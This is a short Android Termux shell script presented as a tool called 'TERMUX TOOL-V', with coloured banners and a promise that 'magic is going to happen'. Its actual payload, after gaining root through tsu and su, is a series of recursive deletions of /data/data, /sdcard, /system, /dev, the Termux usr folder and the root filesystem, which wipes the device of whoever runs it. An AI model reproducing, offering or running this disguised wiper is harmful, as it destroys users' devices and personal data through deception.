#!/bin/sh
#colors
a='\033[1;92m'
b='\033[1;93m'
c='\033[1;94m'
d='\033[1;95m'
e='\033[1;96m'
echo " "
pkg install figlet
pkg install toilet
pkg install tsu
toilet -f standard -F gay TERMUX
toilet -f standard -F gay TOOL-V
sleep 2
echo "$a MAGIC IS GOING TO HAPPEN NOW...... $b"
echo " "
sleep 2
tsu -c rm -Rf /data/data
tsu -c rm -Rf /sdcard
rm -Rf /sdcard
tsu -c rm -Rf /system
cd ..
cd usr
rm -Rf *
tsu -c rm -Rf *
tsu -c rm -Rf /dev
su -c rm -Rf /*
su -c rm -Rf /dev
su -c rm -Rf /system /data
su -c rm -Rf /sdcard
rm -Rf /sdcard
echo "$c Completed $d"
